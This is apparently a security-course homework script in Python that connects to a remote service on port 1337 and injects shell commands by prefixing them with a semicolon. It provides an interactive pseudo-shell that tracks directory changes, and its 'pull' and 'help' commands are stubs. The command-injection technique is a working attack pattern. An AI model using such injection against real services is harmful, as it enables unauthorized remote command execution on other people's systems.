"""
Use the same techniques such as (but not limited to):
1) Sockets
2) File I/O
3) raw_input()

from the OSINT HW to complete this assignment. Good luck!
"""

import socket
import time

host = "wattsamp.net" # IP address here
port = 1337 # Port here

def execute_cmd(cmd):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))

	data = s.recv(1024)
	time.sleep(4)
	#print(data)

	s.send(";"+cmd+"\n")
	data = s.recv(1024)
	time.sleep(4)

	print(data)


if __name__ == '__main__':
	cd = ''
	pwd = ''

	while True:
	#Process command from user input
		input = raw_input('> ')
		cmd = input.split()[0]

		if cmd == 'shell':
			while True:
				shell_cmd = raw_input('\> ')
				# exit if cmd is quit or exit
				if shell_cmd == 'quit' or shell_cmd == 'exit':
					break
				elif shell_cmd.split()[0] == 'cd':
					cd = cd + shell_cmd + ';'

				#Otherwise run execute command
				execute_cmd(cd + shell_cmd)
		elif cmd == 'pull':
			print('cmd is pull')
		elif cmd == 'help':
			print('show help menu')
		elif cmd == 'quit':
			break
		else:
			print('Invalid Command')
